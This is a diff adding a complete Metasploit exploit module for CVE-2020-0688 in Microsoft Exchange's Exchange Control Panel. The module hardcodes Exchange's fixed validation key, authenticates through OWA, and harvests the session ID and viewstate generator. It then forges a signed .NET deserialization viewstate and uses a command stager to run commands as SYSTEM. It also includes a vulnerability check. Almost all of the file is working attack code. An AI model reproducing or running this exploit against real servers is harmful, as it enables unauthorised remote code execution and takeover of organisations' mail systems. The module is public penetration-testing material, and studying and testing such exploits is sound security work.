@@ -1,0 +1,180 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'bindata'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  # include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  DEFAULT_VIEWSTATE_GENERATOR = 'B97B4E27'
+  VALIDATION_KEY = "\xcb\x27\x21\xab\xda\xf8\xe9\xdc\x51\x6d\x62\x1d\x8b\x8b\xf1\x3a\x2c\x9e\x86\x89\xa2\x53\x03\xbf"
+
+  def initialize(info = {})
+    super(update_info(info,
+        'Name'           => 'Exchange Control Panel Viewstate Deserialization',
+        'Description'    => %q{
+          This module exploits a .NET serialization vulnerability in the
+          Exchange Control Panel (ECP) web page. The vulnerability is due to
+          Microsoft Exchange Server not randomizing the keys on a
+          per-installation basis resulting in them using the same validationKey
+          and decryptionKey values. With knowledge of these, values an attacker
+          can craft a special viewstate to cause an OS command to be executed
+          by NT_AUTHORITY\SYSTEM using .NET deserialization.
+        },
+        'Author'         => 'Spencer McIntyre',
+        'License'        => MSF_LICENSE,
+        'References'     => [
+            ['CVE', '2020-0688'],
+            ['URL', 'https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys'],
+        ],
+        'Platform'       => 'win',
+        'Targets'        =>
+          [
+            [ 'Windows (x86)', { 'Arch' => ARCH_X86 } ],
+            [ 'Windows (x64)', { 'Arch' => ARCH_X64 } ],
+            [ 'Windows (cmd)', { 'Arch' => ARCH_CMD, 'Space' => 450 } ]
+          ],
+        'DefaultOptions' =>
+          {
+            'SSL' => true
+          },
+        'DefaultTarget'  => 1,
+        'DisclosureDate' => '2020-02-11',
+        'Notes'          =>
+          {
+            'Stability'   => [ CRASH_SAFE, ],
+            'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],
+            'Reliability' => [ REPEATABLE_SESSION, ],
+          }
+        ))
+
+    register_options([
+      Opt::RPORT(443),
+      OptString.new('TARGETURI', [ true, 'The base path to the web application', '/' ]),
+      OptString.new('USERNAME',  [ true, 'Username to authenticate as', '' ]),
+      OptString.new('PASSWORD',  [ true, 'The password to authenticate with' ])
+    ])
+
+    register_advanced_options([
+      OptFloat.new('CMDSTAGER::DELAY', [ true, 'Delay between command executions', 0.5 ]),
+    ])
+  end
+
+  def check
+    state = get_request_setup
+    viewstate = state[:viewstate]
+    return CheckCode::Unknown if viewstate.nil?
+
+    viewstate = Rex::Text.decode_base64(viewstate)
+    body = viewstate[0...-20]
+    signature = viewstate[-20..-1]
+
+    unless generate_viewstate_signature(state[:viewstate_generator], state[:session_id], body) == signature
+      return CheckCode::Safe
+    end
+
+    # we've validated the signature matches based on the data we have and thus
+    # proven that we are capable of signing a viewstate ourselves
+    CheckCode::Vulnerable
+  end
+
+  def generate_viewstate(generator, session_id, cmd)
+    viewstate = ::Msf::Util::DotNetDeserialization.generate(cmd)
+    signature = generate_viewstate_signature(generator, session_id, viewstate)
+    Rex::Text.encode_base64(viewstate + signature)
+  end
+
+  def generate_viewstate_signature(generator, session_id, viewstate)
+    mac_key_bytes  = Rex::Text.hex_to_raw(generator).unpack('I<').pack('I>')
+    mac_key_bytes << Rex::Text.to_unicode(session_id)
+    OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), VALIDATION_KEY, viewstate + mac_key_bytes)
+  end
+
+  def exploit
+    state = get_request_setup
+
+    # the major limit is the max length of a GET request, the command will be
+    # XML escaped and then base64 encoded which both increase the size
+    if target.arch.first == ARCH_CMD
+      execute_command(payload.encoded, opts={state: state})
+    else
+      cmd_target = targets.select { |target| target.arch.include? ARCH_CMD }.first
+      execute_cmdstager({linemax: cmd_target.opts['Space'], delay: datastore['CMDSTAGER::DELAY'], state: state})
+    end
+  end
+
+  def execute_command(cmd, opts)
+    state = opts[:state]
+    viewstate = generate_viewstate(state[:viewstate_generator], state[:session_id], cmd)
+    5.times do |iteration|
+      # this request *must* be a GET request, can't use POST to use a larger viewstate
+      send_request_cgi({
+        'uri'      => normalize_uri(target_uri.path, 'ecp', 'default.aspx'),
+        'cookie'   => state[:cookies].join(''),
+        'agent'    => state[:user_agent],
+        'vars_get' => {
+          '__VIEWSTATE'          => viewstate,
+          '__VIEWSTATEGENERATOR' => state[:viewstate_generator]
+        }
+      })
+      break
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+      vprint_warning('Encountered a connection error while sending the command, sleeping before retrying')
+      sleep iteration
+    end
+  end
+
+  def get_request_setup
+    # need to use a newer default user-agent than what Metasploit currently provides
+    # see: https://docs.microsoft.com/en-us/microsoft-edge/web-platform/user-agent-string
+    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43'
+    res = send_request_cgi({
+      'uri'           => normalize_uri(target_uri.path, 'owa', 'auth.owa'),
+      'method'        => 'POST',
+      'agent'         => user_agent,
+      'vars_post'     => {
+        'password'    => datastore['PASSWORD'],
+        'flags'       => '4',
+        'destination' => full_uri(normalize_uri(target_uri.path, 'owa')),
+        'username'    => datastore['USERNAME']
+      }
+    })
+    fail_with(Failure::Unreachable, 'The initial HTTP request to the server failed') if res.nil?
+    cookies = [res.get_cookies]
+
+    res = send_request_cgi({
+      'uri'    => normalize_uri(target_uri.path, 'ecp', 'default.aspx'),
+      'cookie' => res.get_cookies,
+      'agent'  => user_agent
+    })
+    fail_with(Failure::UnexpectedReply, 'Failed to get the __VIEWSTATEGENERATOR page') unless res && res.code == 200
+    cookies << res.get_cookies
+
+    viewstate_generator = res.body.scan(/id="__VIEWSTATEGENERATOR"\s+value="([a-fA-F0-9]{8})"/).flatten[0]
+    if viewstate_generator.nil?
+      print_warning("Failed to find the __VIEWSTATEGENERATOR, using the default value: #{DEFAULT_VIEWSTATE_GENERATOR}")
+      viewstate_generator = DEFAULT_VIEWSTATE_GENERATOR
+    else
+      vprint_status("Recovered the __VIEWSTATEGENERATOR: #{viewstate_generator}")
+    end
+
+    viewstate = res.body.scan(/id="__VIEWSTATE"\s+value="([a-zA-Z0-9\+\/]+={0,2})"/).flatten[0]
+    if viewstate.nil?
+      vprint_warning('Failed to find the __VIEWSTATE value')
+    end
+
+    session_id = res.get_cookies.scan(/ASP\.NET_SessionId=([\w\-]+);/).flatten[0]
+    if session_id.nil?
+      fail_with(Failure::UnexpectedReply, 'Failed to get the ASP.NET_SessionId from the response cookies')
+    end
+    vprint_status("Recovered the ASP.NET_SessionID: #{session_id}")
+
+    {user_agent: user_agent, cookies: cookies, viewstate: viewstate, viewstate_generator: viewstate_generator, session_id: session_id}
+  end
+end
